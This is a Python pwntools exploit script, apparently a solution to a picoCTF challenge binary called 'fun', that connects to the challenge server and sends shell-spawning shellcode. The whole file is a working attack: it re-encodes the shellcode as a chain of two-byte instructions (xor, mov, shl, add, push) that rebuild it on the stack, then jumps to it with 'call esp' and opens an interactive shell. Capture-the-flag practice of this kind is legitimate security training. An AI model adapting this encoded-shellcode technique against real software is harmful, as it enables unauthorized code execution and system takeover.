from pwn import *

e = ELF("./fun")
#libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("mercury.picoctf.net", 35338)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})


#goal = asm(shellcraft.sh())
#goal = asm("mov eax, 0x1337\njmp eax")
goal = asm(shellcraft.sh())
goal += ((4 - len(goal) % 4) % 4) * asm("nop")

pay = ""
for i in range(len(goal) / 4):
  pay += asm("xor eax, eax")
  pay += asm("xor edx, edx")
  for j in range(4):
    pay += asm("mov dl, " + hex(ord(goal[len(goal) - 1 - 4*i - j])))

    for k in range(8):
      pay += asm("shl eax, 1")

      if len(pay) % 2 != 0:
        print("ABORT")

    pay += asm("add eax, edx")
  pay += asm("push eax\nnop")

pay += asm("xor eax, eax")
pay += asm("call esp")

print(len(pay))

debug()
p.sendlineafter("run:", pay)

p.interactive()
